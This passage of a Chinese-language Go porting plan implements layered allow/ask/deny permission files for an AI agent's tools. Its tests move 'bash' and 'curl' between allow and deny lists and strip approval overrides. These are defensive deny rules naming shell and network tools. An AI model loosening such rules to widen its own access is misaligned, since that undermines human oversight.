// TestSetUserToolLevel_单列表约束 测试工具只留在一个列表里且追加到末尾
func TestSetUserToolLevel_单列表约束(t *testing.T) {
	layer := map[string]any{"allow_tools": []any{"bash", "curl"}}
	removed := setUserToolLevel(layer, "bash", "deny")

	if !removed {
		t.Error("从 allow 移到 deny 应返回 removedAllow=true")
	}
	allow, _ := layer["allow_tools"].([]any)
	if len(allow) != 1 || allow[0] != "curl" {
		t.Errorf("allow_tools = %v, want [curl]", allow)
	}
	deny, _ := layer["deny_tools"].([]any)
	if len(deny) != 1 || deny[0] != "bash" {
		t.Errorf("deny_tools = %v, want [bash]", deny)
	}
}

// TestStripToolOverrides_共享规则只摘名字 测试多工具共享的 override 只摘该工具
func TestStripToolOverrides_共享规则只摘名字(t *testing.T) {
	layer := map[string]any{
		"approval_overrides": []any{
			map[string]any{"id": "o1", "tools": []any{"bash"}, "pattern": "*"},
			map[string]any{"id": "o2", "tools": []any{"bash", "curl"}, "pattern": "*"},
			map[string]any{"id": "o3", "tools": []any{"curl"}, "pattern": "*"},
		},
	}
	removed := stripToolOverrides(layer, "bash")
	if removed != 2 {
		t.Errorf("removed = %d, want 2", removed)
	}
	overrides, _ := layer["approval_overrides"].([]any)
	if len(overrides) != 2 {
		t.Fatalf("剩余 %d 条，want 2", len(overrides))
	}
	// o2 应保留但只含 curl
	second, _ := overrides[0].(map[string]any)
	if second["id"] != "o2" {
		t.Fatalf("首条应为 o2，got %v", second["id"])
	}
	tools, _ := second["tools"].([]any)
	if len(tools) != 1 || tools[0] != "curl" {
		t.Errorf("o2.tools = %v, want [curl]", tools)
	}
}
```

> `mustOrderedMap` 需要保序的 map 构造。由于 Go `map` 无序，`orderedToolNamesAtLevel` 必须从 `yaml.Node` 或有序结构取键。**实现时若发现无法保序，需改变函数签名接受有序键列表**——这会传回上层影响调用点，属重大设计变更，**停止并汇报**。

- [ ] **Step 2: 实现 40 个函数**

按功能分五组，**每组写完就跑该组测试**。最大风险是 `orderedToolNamesAtLevel` 的顺序（Python dict 保插入序，Go map 不保序）。

**2a. 常量与路径**

```go
// ──────────────────────────── 常量 ────────────────────────────

const (
	// lockTimeout 权限文件锁超时，对齐 Python 默认 10s
	lockTimeout = 10 * time.Second
)

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// toolLevels 工具级允许的 level 取值
	toolLevels = map[string]struct{}{"allow": {}, "ask": {}, "deny": {}}
	// listKeys 三个列表键，顺序即 _setUserToolLevel 的迭代序
	listKeys = []string{"allow_tools", "ask_tools", "deny_tools"}
	// overlayKeys 判定「是否为 overlay 自身」的键集合
	overlayKeys = map[string]struct{}{
		"allow_tools": {}, "ask_tools": {}, "deny_tools": {},
		"approval_overrides": {}, "file_guard": {}, "tools": {},
		"rules": {}, "net_guard": {}, "shell_guard": {},
	}
	// engineOnlyKeys 写盘前要剔除的「引擎专用」键
	engineOnlyKeys = map[string]struct{}{
		"net_guard": {}, "shell_guard": {}, "defaults": {}, "tools": {}, "enabled": {},
	}
)

// UserPermissionsPath 用户级权限文件路径。
//
// Python: user_permissions_path()
func UserPermissionsPath() string {
	return filepath.Join(getConfigDir(), "user_permissions.yaml")
}

// SessionPermissionsPath 会话级权限文件路径。sessionID 为空时报错。
//
// Python: session_permissions_path(session_id)
func SessionPermissionsPath(sessionID string) (string, error) {
	sid := strings.TrimSpace(sessionID)
	if sid == "" {
		return "", fmt.Errorf("session_id is required")
	}
	return filepath.Join(getAgentSessionsDir(), sid, "session_permissions.yaml"), nil
}
```

**2b. YAML 读写与形态归整**

```go
// loadYAMLDict 读取 YAML 为 map。strict 为真时读失败/非 mapping 直接报错。
//
// Python: _load_yaml_dict(path, *, strict=False)
func loadYAMLDict(path string, strict bool) (map[string]any, error) {
	info, err := os.Stat(path)
	if err != nil || info.IsDir() {
		if strict {
			if err != nil {
				return nil, err
			}
			return map[string]any{}, nil
		}
		return map[string]any{}, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		if strict {
			return nil, err
		}
		logger.Warn(logComponent).Str("path", path).Err(err).
			Msg("permissions.layers.load_failed")
		return map[string]any{}, nil
	}
	var out map[string]any
	if err := yaml.Unmarshal(data, &out); err != nil {
		if strict {
			return nil, err
		}
		logger.Warn(logComponent).Str("path", path).Err(err).
			Msg("permissions.layers.load_failed")
		return map[string]any{}, nil
	}
	if out == nil {
		out = map[string]any{}
	}
	return out, nil
}

// dumpYAMLDict 写出 map 到 YAML。失败返回 false 并 WARN。
//
// Python: _dump_yaml_dict(path, data)
func dumpYAMLDict(path string, data map[string]any) bool {
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		logger.Warn(logComponent).Str("path", path).Err(err).
			Msg("permissions.layers.dump_failed")
		return false
	}
	payload, err := yaml.Marshal(data)
	if err != nil {
		logger.Warn(logComponent).Str("path", path).Err(err).
			Msg("permissions.layers.dump_failed")
		return false
	}
	if err := os.WriteFile(path, payload, 0o644); err != nil {
		logger.Warn(logComponent).Str("path", path).Err(err).
			Msg("permissions.layers.dump_failed")
		return false
	}
	return true
}

// asPermissionsSection 归整为 overlay 形态。
//
// 顶层是 {permissions: {...}} 且自身不含 overlay 键时取内层；否则取自身。
//
// Python: _as_permissions_section(raw)
func asPermissionsSection(raw any) map[string]any {
	m, ok := raw.(map[string]any)
	if !ok {
		return map[string]any{}
	}
	inner, hasInner := m["permissions"].(map[string]any)
	if hasInner {
		selfHasOverlay := false
		for key := range overlayKeys {
			if _, has := m[key]; has {
				selfHasOverlay = true
				break
			}
		}
		if !selfHasOverlay {
			return shallowCopyMap(inner)
		}
	}
	return shallowCopyMap(m)
}

// scalarLevel 取标量 level；dict 形态取 "*" 键。非法值返回空串。
//
// Python: _scalar_level(raw)
func scalarLevel(raw any) string {
	if m, ok := raw.(map[string]any); ok {
		raw = m["*"]
	}
	s, ok := raw.(string)
	if !ok {
		return ""
	}
	lv := strings.ToLower(strings.TrimSpace(s))
	if _, valid := toolLevels[lv]; !valid {
		return ""
	}
	return lv
}

// strNames 过滤出非空字符串项。
//
// Python: _str_names(raw)
func strNames(raw any) []string {
	list, ok := raw.([]any)
	if !ok {
		return nil
	}
	out := make([]string, 0, len(list))
	for _, item := range list {
		if s, ok := item.(string); ok && strings.TrimSpace(s) != "" {
			out = append(out, strings.TrimSpace(s))
		}
	}
	return out
}
```

**2c. 层级工具名（顺序敏感）**

```go
// orderedToolNamesAtLevel 取某层的指定 level 工具名，保持顺序且去重。
//
// 顺序：先 tools 字典里该 level 的键（按插入序），再该 level 列表的项。
// Python dict 保插入序，Go map 不保序——因此 loadYAMLDict 必须返回
// 保序结构，或本函数接受有序键列表。
//
// ⚠️ 实现约束：若不改造 loadYAMLDict 返回保序类型，此函数无法正确工作。
// 采用方案：用 yaml.v3 的 Node 单独取 tools 段的键序（见 orderedToolsKeys）。
//
// Python: _ordered_tool_names_at_level(layer, level)
func orderedToolNamesAtLevel(layer map[string]any, level string) []string {
	names := make([]string, 0, 8)
	seen := make(map[string]struct{}, 8)
	add := func(name string) {
		if name == "" {
			return
		}
		if _, dup := seen[name]; dup {
			return
		}
		seen[name] = struct{}{}
		names = append(names, name)
	}

	if tools, ok := layer["tools"].(map[string]any); ok {
		for _, name := range orderedToolsKeys(layer) {
			raw, has := tools[name]
			if !has || strings.TrimSpace(name) == "" {
				continue
			}
			if scalarLevel(raw) == level {
				add(strings.TrimSpace(name))
			}
		}
	}
	key := map[string]string{"allow": "allow_tools", "ask": "ask_tools", "deny": "deny_tools"}[level]
	for _, name := range strNames(layer[key]) {
		add(name)
	}
	return names
}

// orderedToolsKeys 返回 layer["tools"] 的键序。依赖 layer 里携带的
// 顺序信息（由 loadYAMLDictOrdered 写入的 __tools_order__ 私有键）。
//
// 若无顺序信息，退化为按字典序（结果稳定但不保原序）。
func orderedToolsKeys(layer map[string]any) []string {
	if order, ok := layer["__tools_order__"].([]string); ok {
		return order
	}
	tools, ok := layer["tools"].(map[string]any)
	if !ok {
		return nil
	}
	keys := make([]string, 0, len(tools))
	for k := range tools {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

// toolNamesAtLevel 取某层指定 level 的工具名集合。
//
// Python: _tool_names_at_level(layer, level)
func toolNamesAtLevel(layer map[string]any, level string) map[string]struct{} {
	out := make(map[string]struct{}, 8)
	for _, name := range orderedToolNamesAtLevel(layer, level) {
		out[name] = struct{}{}
	}
	return out
}
```

> 🔴 **`orderedToolsKeys` 的策略**：Python 靠 dict 插入序。Go 要复现，必须在读 YAML 时记录 `tools` 段的键序。`loadYAMLDict` 用 `yaml.Unmarshal` 到 map 会丢序。
>
> **两个选择**：
> - **A**：`loadYAMLDict` 改用 `yaml.Node` 解析，额外返回键序表（改动大，但对齐最彻底）
> - **B**：接受「按字典序」的近似（结果稳定，但 Python 若依赖插入序则结果不同）
>
> **采用 A**：在 `permissions_layers.go` 内加一个 `loadYAMLDictOrdered`，用 `yaml.Node` 解析顶层，把 `tools` 段的键序写进私有键 `__tools_order__`（写盘前剔除）。这是唯一能对齐 Python 的方式。

```go
// loadYAMLDictOrdered 读取 YAML 并记录 tools 段键序。
//
// 与 loadYAMLDict 的差别：用 yaml.Node 解析，把 layer["tools"] 的键序
// 写入私有键 __tools_order__，供 orderedToolNamesAtLevel 复现 Python
// 的 dict 插入序。__tools_order__ 在写盘前必须剔除（见 stripPrivateKeys）。
func loadYAMLDictOrdered(path string, strict bool) (map[string]any, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		if strict {
			return nil, err
		}
		return map[string]any{}, nil
	}
	var root yaml.Node
	if err := yaml.Unmarshal(data, &root); err != nil {
		if strict {
			return nil, err
		}
		return map[string]any{}, nil
	}
	out := map[string]any{}
	if len(root.Content) == 0 {
		return out, nil
	}
	// root 通常是 DocumentNode，其 Content[0] 才是 mapping
	node := root.Content[0]
	if err := node.Decode(&out); err != nil {
		if strict {
			return nil, err
		}
		return map[string]any{}, nil
	}
	// section 可能包一层 permissions
	section := out
	if inner, ok := out["permissions"].(map[string]any); ok {
		section = inner
	}
	if toolsNode := lookupMapValueNode(node, "tools", out, section); toolsNode != nil {
		keys := make([]string, 0, len(toolsNode.Content)/2)
		for i := 0; i+1 < len(toolsNode.Content); i += 2 {
			keys = append(keys, toolsNode.Content[i].Value)
		}
		section["__tools_order__"] = keys
	}
	return out, nil
}

// lookupMapValueNode 在 YAML Node 树里找到 section 对应的 "tools" 子节点。
func lookupMapValueNode(root *yaml.Node, key string, out, section map[string]any) *yaml.Node {
	// 定位 section 对应的节点：若 out 与 section 不同，说明有 permissions 包装
	target := root
	if len(root.Content) > 0 && root.Content[0].Kind == yaml.MappingNode {
		target = root.Content[0]
	}
	if !sameMap(out, section) {
		if inner := mappingValueNode(target, "permissions"); inner != nil {
			target = inner
		}
	}
	for i := 0; i+1 < len(target.Content); i += 2 {
		if target.Content[i].Value == key && target.Content[i+1].Kind == yaml.MappingNode {
			return target.Content[i+1]
		}
	}
	return nil
}

// mappingValueNode 取 mapping 节点里某个键的值节点。
func mappingValueNode(n *yaml.Node, key string) *yaml.Node {
	if n == nil || n.Kind != yaml.MappingNode {
		return nil
	}
	for i := 0; i+1 < len(n.Content); i += 2 {
		if n.Content[i].Value == key {
			return n.Content[i+1]
		}
	}
	return nil
}

// sameMap 判定两个 map 是否同一实例（用于判断是否有 permissions 包装）。
func sameMap(a, b map[string]any) bool {
	if len(a) != len(b) {
		return false
	}
	// 内容相同即视为同一层（简化判断，够用于本场景）
	for k, v := range a {
		bv, ok := b[k]
		if !ok || !reflect.DeepEqual(v, bv) {
			return false
		}
	}
	return true
}

// stripPrivateKeys 剔除内部私有键，写盘前必须调用。
func stripPrivateKeys(layer map[string]any) map[string]any {
	out := make(map[string]any, len(layer))
	for k, v := range layer {
		if strings.HasPrefix(k, "__") && strings.HasSuffix(k, "__") {
			continue
		}
		out[k] = v
	}
	return out
}
```

**2d. override 与 path 的键计算**

```go
// overrideIDSet 提取 approval_overrides 里所有非空 id。
//
// Python: _override_ids(raw)
func overrideIDSet(raw any) map[string]struct{} {
	out := map[string]struct{}{}
	list, ok := raw.([]any)
	if !ok {
		return out
	}
	for _, item := range list {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		if id, _ := m["id"].(string); strings.TrimSpace(id) != "" {
			out[strings.TrimSpace(id)] = struct{}{}
		}
	}
	return out
}

// normalizedToolNames 归一化 override 的 tools 字段为字符串列表。
// str 视为单元素列表；其他非列表类型返回空。
//
// Python: _normalized_tool_names(item)
func normalizedToolNames(item map[string]any) []string {
	raw := item["tools"]
	if raw == nil {
		return nil
	}
	switch v := raw.(type) {
	case string:
		if s := strings.TrimSpace(v); s != "" {
			return []string{s}
		}
		return nil
	case []any:
		out := make([]string, 0, len(v))
		for _, t := range v {
			if s, ok := t.(string); ok && strings.TrimSpace(s) != "" {
				out = append(out, strings.TrimSpace(s))
			}
		}
		return out
	}
	return nil
}

// overrideKey 一条 override 的签名键，用于判定「是否已存在于下层」。
//
// Python: _override_key(item) → ("signature", (tools_key, match_type, pattern, action))
func overrideKey(item map[string]any) string {
	names := normalizedToolNames(item)
	sort.Strings(names)
	matchType := strings.ToLower(strings.TrimSpace(stringOrDefault(item["match_type"], "")))
	pattern := stringOrDefault(item["pattern"], "")
	action := strings.ToLower(strings.TrimSpace(stringOrDefault(item["action"], "")))
	return "signature\x00" + strings.Join(names, "\x01") + "\x00" + matchType + "\x00" + pattern + "\x00" + action
}

// overrideKeySet 一批 override 的签名键集合。
//
// Python: _override_keys(raw)
func overrideKeySet(raw any) map[string]struct{} {
	out := map[string]struct{}{}
	list, ok := raw.([]any)
	if !ok {
		return out
	}
	for _, item := range list {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		out[overrideKey(m)] = struct{}{}
	}
	return out
}

// stableOverrideID 由 override 内容推导稳定 id（同内容得同 id）。
//
// Python: _stable_override_id(item)
func stableOverrideID(item map[string]any) string {
	names := normalizedToolNames(item)
	sort.Strings(names)
	payload := strings.Join(names, ",") + "|" +
		stringOrDefault(item["match_type"], "") + "|" +
		stringOrDefault(item["pattern"], "") + "|" +
		stringOrDefault(item["action"], "")
	sum := sha256.Sum256([]byte(payload))
	return "ov_" + hex.EncodeToString(sum[:8])
}

// uniqueOverrideIDs 保证 override id 在给定集合内唯一，冲突时重新生成。
//
// Python: _unique_override_ids(items, reserved_ids)
func uniqueOverrideIDs(items []map[string]any, reserved map[string]struct{}) []map[string]any {
	used := make(map[string]struct{}, len(items)+len(reserved))
	for id := range reserved {
		used[id] = struct{}{}
	}
	out := make([]map[string]any, 0, len(items))
	for _, item := range items {
		copied := shallowCopyMap(item)
		id := strings.TrimSpace(stringOrDefault(copied["id"], ""))
		if id == "" {
			id = stableOverrideID(item)
		}
		if _, dup := used[id]; dup {
			id = stableOverrideID(item) + "_" + strconv.Itoa(len(used))
			for {
				if _, stillDup := used[id]; !stillDup {
					break
				}
				id += "x"
			}
		}
		copied["id"] = id
		used[id] = struct{}{}
		out = append(out, copied)
	}
	return out
}

// pathKey 一条 file_guard.paths 条目的 (path, match) 键。
//
// Python: _path_key(item)
func pathKey(item map[string]any) (string, string) {
	pathNorm := strings.TrimSuffix(strings.ReplaceAll(stringOrDefault(item["path"], ""), `\`, "/"), "/")
	return pathNorm, stringOrDefault(item["match"], "prefix")
}

// pathKeySet 某层所有 file_guard.paths 的 (path, match) 键集合。
//
// Python: _path_keys(layer)
func pathKeySet(layer map[string]any) map[string]struct{} {
	out := map[string]struct{}{}
	fg, ok := layer["file_guard"].(map[string]any)
	if !ok {
		return out
	}
	list, ok := fg["paths"].([]any)
	if !ok {
		return out
	}
	for _, item := range list {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		if _, isBuiltin := m["layer"]; isBuiltin && m["layer"] == "builtin" {
			continue
		}
		p, mt := pathKey(m)
		out[p+"\x00"+mt] = struct{}{}
	}
	return out
}
```

**2e. 三层读取与 overlay 差分**

```go
// LoadGlobalPermissions 从 agent 配置文件取 permissions 段。
//
// Python: load_global_permissions() → get_config().get("permissions")
func LoadGlobalPermissions() map[string]any {
	data, err := readConfigYAML()
	if err != nil {
		return map[string]any{}
	}
	perms, ok := data["permissions"].(map[string]any)
	if !ok {
		return map[string]any{}
	}
	return shallowCopyMap(perms)
}

// LoadUserPermissions 读用户级 overlay。
//
// Python: load_user_permissions()
func LoadUserPermissions() map[string]any {
	data, _ := loadYAMLDictOrdered(UserPermissionsPath(), false)
	return asPermissionsSection(data)
}

// LoadSessionPermissions 读会话级 overlay。sessionID 为空返回空。
//
// Python: load_session_permissions(session_id)
func LoadSessionPermissions(sessionID string) map[string]any {
	if strings.TrimSpace(sessionID) == "" {
		return map[string]any{}
	}
	path, err := SessionPermissionsPath(sessionID)
	if err != nil {
		return map[string]any{}
	}
	data, _ := loadYAMLDictOrdered(path, false)
	return asPermissionsSection(data)
}

// ReadPermissionLayersLocked 严格读三层。调用方必须已持有
// PermissionStorageLock。
//
// Python: read_permission_layers_locked(session_id, *, global_permissions=None)
func ReadPermissionLayersLocked(sessionID string, globalPermissions map[string]any) (map[string]any, map[string]any, map[string]any, error) {
	global := globalPermissions
	if global == nil {
		data, err := readConfigYAML()
		if err != nil {
			return nil, nil, nil, err
		}
		perms, ok := data["permissions"].(map[string]any)
		if !ok {
			return nil, nil, nil, fmt.Errorf("Global permissions must contain a mapping")
		}
		global = perms
	}
	userData, err := loadYAMLDictOrdered(UserPermissionsPath(), true)
	if err != nil {
		return nil, nil, nil, err
	}
	session := map[string]any{}
	if strings.TrimSpace(sessionID) != "" {
		path, err := SessionPermissionsPath(sessionID)
		if err != nil {
			return nil, nil, nil, err
		}
		sessionData, err := loadYAMLDictOrdered(path, true)
		if err != nil {
			return nil, nil, nil, err
		}
		session = asPermissionsSection(sessionData)
	}
	return utils.DeepCopyMap(global), asPermissionsSection(userData), session, nil
}

// OverlayFromEffective 从生效配置差分出 User/Session overlay。
//
// base 计算的不对称（对齐 Python，不可统一）：
//   - base_allow 算 Global + User(或 Session) 三层
//   - base_ask / base_deny 只算 Global
//
// session=true 时不输出 ask_tools / deny_tools（Session 层不允许 ask/deny）。
//
// Python: overlay_from_effective(effective, *, session, global_permissions, user_permissions, session_permissions)
func OverlayFromEffective(
	effective map[string]any,
	session bool,
	globalPermissions map[string]any,
	userPermissions map[string]any,
	sessionPermissions map[string]any,
) map[string]any {
	src := effective
	if src == nil {
		src = map[string]any{}
	}
	globalLayer := asPermissionsSection(nilIfEmpty(globalPermissions, LoadGlobalPermissions))
	var userLayer, skipLayer map[string]any
	if session {
		userLayer = asPermissionsSection(nilIfEmpty(userPermissions, LoadUserPermissions))
		skipLayer = map[string]any{}
	} else {
		userLayer = map[string]any{}
		skipLayer = asPermissionsSection(sessionPermissions)
	}

	baseAllow := unionSets(
		toolNamesAtLevel(globalLayer, "allow"),
		toolNamesAtLevel(userLayer, "allow"),
		toolNamesAtLevel(skipLayer, "allow"),
	)
	baseAsk := toolNamesAtLevel(globalLayer, "ask")
	baseDeny := toolNamesAtLevel(globalLayer, "deny")
	baseOverrideKeys := unionSets(
		overrideKeySet(globalLayer["approval_overrides"]),
		overrideKeySet(userLayer["approval_overrides"]),
		overrideKeySet(skipLayer["approval_overrides"]),
	)
	baseOverrideIDs := unionSets(
		overrideIDSet(globalLayer["approval_overrides"]),
		overrideIDSet(userLayer["approval_overrides"]),
		overrideIDSet(skipLayer["approval_overrides"]),
	)
	basePathKeys := unionSets(pathKeySet(globalLayer), pathKeySet(userLayer), pathKeySet(skipLayer))

	out := map[string]any{}

	srcAllow := orderedToolNamesAtLevel(src, "allow")
	srcAllowSet := make(map[string]struct{}, len(srcAllow))
	for _, n := range srcAllow {
		srcAllowSet[n] = struct{}{}
	}
	allow := make([]any, 0, len(srcAllow))
	for _, name := range srcAllow {
		if _, inBase := baseAllow[name]; !inBase {
			allow = append(allow, name)
		}
	}
	if len(allow) > 0 {
		out["allow_tools"] = allow
	}

	if !session {
		ask := make([]any, 0, 4)
		for _, name := range orderedToolNamesAtLevel(src, "ask") {
			if _, inBase := baseAsk[name]; inBase {
				continue
			}
			if _, isSrcAllow := srcAllowSet[name]; isSrcAllow {
				continue
			}
			ask = append(ask, name)
		}
		deny := make([]any, 0, 4)
		for _, name := range orderedToolNamesAtLevel(src, "deny") {
			if _, inBase := baseDeny[name]; inBase {
				continue
			}
			if _, isSrcAllow := srcAllowSet[name]; isSrcAllow {
				continue
			}
			deny = append(deny, name)
		}
		if len(ask) > 0 {
			out["ask_tools"] = ask
		}
		if len(deny) > 0 {
			out["deny_tools"] = deny
		}
	}

	var overrides []map[string]any
	if list, ok := src["approval_overrides"].([]any); ok {
		for _, item := range list {
			m, ok := item.(map[string]any)
			if !ok {
				continue
			}
			if strings.TrimSpace(stringOrDefault(m["id"], "")) == "" {
				continue
			}
			if _, inBase := baseOverrideKeys[overrideKey(m)]; inBase {
				continue
			}
			overrides = append(overrides, m)
		}
	}
	if len(overrides) > 0 {
		out["approval_overrides"] = toAnySliceFromMaps(uniqueOverrideIDs(overrides, baseOverrideIDs))
	}

	if fg, ok := src["file_guard"].(map[string]any); ok {
		paths := make([]any, 0, 4)
		if list, ok := fg["paths"].([]any); ok {
			for _, item := range list {
				m, ok := item.(map[string]any)
				if !ok {
					continue
				}
				if m["layer"] == "builtin" {
					continue
				}
				p, mt := pathKey(m)
				if _, inBase := basePathKeys[p+"\x00"+mt]; inBase {
					continue
				}
				paths = append(paths, m)
			}
		}
		if len(paths) > 0 {
			out["file_guard"] = map[string]any{"paths": paths}
		}
	}
	return out
}
```

**2f. 合并回写与工具级更新**

```go
// mergeOverlayIntoCurrent 把 overlay 并入当前层文档。
// 先剔除引擎专用键与列表键，再合并 overlay；session 层额外剔除 deny/ask/enabled。
//
// Python: _merge_overlay_into_current(current, overlay, *, session)
func mergeOverlayIntoCurrent(current, overlay map[string]any, session bool) map[string]any {
	out := shallowCopyMap(current)
	for key := range engineOnlyKeys {
		delete(out, key)
	}
	for _, key := range listKeys {
		delete(out, key)
	}
	delete(out, "approval_overrides")
	if fg, ok := out["file_guard"].(map[string]any); ok {
		copied := shallowCopyMap(fg)
		delete(copied, "paths")
		if len(copied) > 0 {
			out["file_guard"] = copied
		} else {
			delete(out, "file_guard")
		}
	}
	for k, v := range overlay {
		out[k] = v
	}
	if session {
		delete(out, "deny_tools")
		delete(out, "ask_tools")
		delete(out, "enabled")
	}
	return out
}

// PersistUserOverlayFromEffective 从生效配置差分出 user overlay 并写盘。
//
// Python: persist_user_overlay_from_effective(effective, session_id=None)
func PersistUserOverlayFromEffective(effective map[string]any, sessionID string) bool {
	release, err := PermissionStorageLock(sessionID)
	if err != nil {
		return false
	}
	defer release()

	overlay := OverlayFromEffective(effective, false, nil, nil, LoadSessionPermissions(sessionID))
	current := mergeOverlayIntoCurrent(LoadUserPermissions(), overlay, false)
	return dumpYAMLDict(UserPermissionsPath(), stripPrivateKeys(current))
}

// PersistSessionOverlayFromEffective 从生效配置差分出 session overlay 并写盘。
//
// Python: persist_session_overlay_from_effective(session_id, effective)
func PersistSessionOverlayFromEffective(sessionID string, effective map[string]any) bool {
	if strings.TrimSpace(sessionID) == "" {
		return false
	}
	path, err := SessionPermissionsPath(sessionID)
	if err != nil {
		return false
	}
	release, err := PermissionStorageLock(sessionID)
	if err != nil {
		return false
	}
	defer release()

	overlay := OverlayFromEffective(effective, true, nil, nil, nil)
	current := mergeOverlayIntoCurrent(LoadSessionPermissions(sessionID), overlay, true)
	return dumpYAMLDict(path, stripPrivateKeys(current))
}

// ListSavedSessionIDs 返回已有 session_permissions.yaml 的会话 id，升序。
//
// Python: list_saved_session_ids()
func ListSavedSessionIDs() []string {
	root := getAgentSessionsDir()
	entries, err := os.ReadDir(root)
	if err != nil {
		return nil
	}
	var found []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		candidate := filepath.Join(root, e.Name(), "session_permissions.yaml")
		if info, err := os.Stat(candidate); err == nil && !info.IsDir() {
			found = append(found, e.Name())
		}
	}
	sort.Strings(found)
	return found
}

// toolList 取某列表键，非 list 返回空。
//
// Python: _tool_list(layer, key)
func toolList(layer map[string]any, key string) []any {
	list, ok := layer[key].([]any)
	if !ok {
		return nil
	}
	return list
}

// listHasTool 列表中是否有该工具名（**逐项 strip 后比较**）。
//
// Python: _list_has_tool(items, tool)
func listHasTool(items []any, tool string) bool {
	for _, item := range items {
		if s, ok := item.(string); ok && strings.TrimSpace(s) == tool {
			return true
		}
	}
	return false
}

// withoutTool 移除列表中该工具名（逐项 strip 后比较）。
//
// Python: _without_tool(items, tool)
func withoutTool(items []any, tool string) []any {
	out := make([]any, 0, len(items))
	for _, item := range items {
		if s, ok := item.(string); ok && strings.TrimSpace(s) == tool {
			continue
		}
		out = append(out, item)
	}
	return out
}

// setUserToolLevel 让工具只留在一个列表里。返回是否从 allow 列表移除。
//
// 迭代顺序 deny → ask → allow（对齐 Python 三元组顺序）；目标 level 的项
// 追加到末尾。
//
// Python: _set_user_tool_level(layer, tool, level)
func setUserToolLevel(layer map[string]any, tool, level string) bool {
	removedAllow := listHasTool(toolList(layer, "allow_tools"), tool) && level != "allow"

	for _, pair := range [][2]string{{"deny_tools", "deny"}, {"ask_tools", "ask"}, {"allow_tools", "allow"}} {
		key, listed := pair[0], pair[1]
		kept := withoutTool(toolList(layer, key), tool)
		if listed == level {
			kept = append(kept, tool)
		}
		if len(kept) > 0 {
			layer[key] = kept
		} else {
			delete(layer, key)
		}
	}

	if tools, ok := layer["tools"].(map[string]any); ok {
		for k := range tools {
			if strings.TrimSpace(k) == tool {
				delete(tools, k)
			}
		}
		if len(tools) == 0 {
			delete(layer, "tools")
		}
	}
	return removedAllow
}

// dropSessionAllow 移除会话的记忆允许。返回是否有变更。
//
// Python: _drop_session_allow(layer, tool)
func dropSessionAllow(layer map[string]any, tool string) bool {
	changed := false
	allowed := toolList(layer, "allow_tools")
	if listHasTool(allowed, tool) {
		kept := withoutTool(allowed, tool)
		if len(kept) > 0 {
			layer["allow_tools"] = kept
		} else {
			delete(layer, "allow_tools")
		}
		changed = true
	}
	if tools, ok := layer["tools"].(map[string]any); ok {
		for k, v := range tools {
			if strings.TrimSpace(k) == tool && scalarLevel(v) == "allow" {
				delete(tools, k)
				changed = true
			}
		}
		if len(tools) == 0 {
			delete(layer, "tools")
		}
	}
	return changed
}

// stripToolOverrides 删除只指向该工具的 override；共享规则只摘该工具名。
// 返回被移除的 override 条数（不是工具名数）。
//
// Python: _strip_tool_overrides(layer, tool)
func stripToolOverrides(layer map[string]any, tool string) int {
	overrides, ok := layer["approval_overrides"].([]any)
	if !ok {
		return 0
	}
	kept := make([]any, 0, len(overrides))
	removed := 0
	changed := false
	for _, item := range overrides {
		m, ok := item.(map[string]any)
		if !ok {
			kept = append(kept, item)
			continue
		}
		toolsRaw, ok := m["tools"].([]any)
		if !ok {
			kept = append(kept, item)
			continue
		}
		names := make([]string, 0, len(toolsRaw))
		for _, t := range toolsRaw {
			if s, ok := t.(string); ok && strings.TrimSpace(s) != "" {
				names = append(names, strings.TrimSpace(s))
			}
		}
		if !containsString(names, tool) {
			kept = append(kept, item)
			continue
		}
		changed = true
		removed++
		rest := make([]string, 0, len(names))
		for _, n := range names {
			if n != tool {
				rest = append(rest, n)
			}
		}
		if len(rest) == 0 {
			continue
		}
		updated := shallowCopyMap(m)
		updated["tools"] = toAnySlice(rest)
		kept = append(kept, updated)
	}
	if changed {
		if len(kept) > 0 {
			layer["approval_overrides"] = kept
		} else {
			delete(layer, "approval_overrides")
		}
	}
	return removed
}

// UpdateUserToolLevel 设置用户层的工具级别。ask 时同时撤销记忆的允许。
//
// 阶段一（持锁）：改 user 层；level=ask 时还要清 override 与所有 session 的 allow。
// 阶段二（锁外）：compose 生效配置并返回。
//
// Python: update_user_tool_level(tool_name, level)
func UpdateUserToolLevel(toolName, level string) (map[string]any, error) {
	name := strings.TrimSpace(toolName)
	lv := strings.ToLower(strings.TrimSpace(level))
	if name == "" {
		return nil, fmt.Errorf("tool name must be non-empty")
	}
	if _, valid := toolLevels[lv]; !valid {
		return nil, fmt.Errorf("level must be allow, ask, or deny")
	}

	revoked := map[string]any{
		"user_allow":         0,
		"session_allow":      0,
		"approval_overrides": 0,
	}

	var globalPermissions, savedUser map[string]any
	func() {
		release, err := PermissionStorageLock("")
		if err != nil {
			return
		}
		defer release()

		user := LoadUserPermissions()
		if setUserToolLevel(user, name, lv) {
			revoked["user_allow"] = 1
		}
		if lv == "ask" {
			overrideCnt := stripToolOverrides(user, name)
			for _, sid := range ListSavedSessionIDs() {
				sessionPath, pathErr := SessionPermissionsPath(sid)
				if pathErr != nil {
					continue
				}
				sessLock, lockErr := local.AcquireFileLock(sessionPath, lockTimeout)
				if lockErr != nil {
					continue
				}
				session := LoadSessionPermissions(sid)
				overrides := stripToolOverrides(session, name)
				dropped := dropSessionAllow(session, name)
				overrideCnt += overrides
				if dropped {
					revoked["session_allow"] = revoked["session_allow"].(int) + 1
				}
				if dropped || overrides > 0 {
					if !dumpYAMLDict(sessionPath, stripPrivateKeys(session)) {
						_ = local.ReleaseFileLock(sessLock)
						return
					}
				}
				_ = local.ReleaseFileLock(sessLock)
			}
			revoked["approval_overrides"] = overrideCnt
		}
		if !dumpYAMLDict(UserPermissionsPath(), stripPrivateKeys(user)) {
			return
		}
		globalPermissions = LoadGlobalPermissions()
		savedUser = user
	}()

	effective := map[string]any{}
	// ⤵️ 9.90d 回填：compose_host_effective_permissions（permission_compose.py 362 行）
	// 未实现前 effective 为空，effective_level 恒为 nil。

	tools, _ := effective["tools"].(map[string]any)
	effectiveLevel := ""
	if v, ok := tools[name].(string); ok {
		effectiveLevel = v
	}
	return map[string]any{
		"tool":           name,
